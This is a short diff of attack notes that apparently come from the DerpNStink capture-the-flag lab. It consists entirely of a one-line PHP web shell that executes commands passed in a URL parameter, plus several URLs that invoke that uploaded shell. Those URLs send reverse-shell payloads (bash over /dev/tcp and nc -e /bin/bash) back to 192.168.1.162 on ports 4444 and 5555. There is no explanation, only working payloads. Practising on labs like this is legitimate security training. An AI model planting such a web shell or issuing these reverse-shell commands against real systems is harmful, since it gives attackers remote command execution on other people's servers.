@@ -1,3 +1,7 @@
 <?php system($_GET['cmd']); ?>
 
 http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.1.162/4444+0>%261'
+
+http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?cmd=bash+-c+'bash+-i+>%26/dev/tcp/192.168.1.162/5555+0>%261'
+
+http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php?cmd=nc+-e+/bin/bash+192.168.1.162+5555
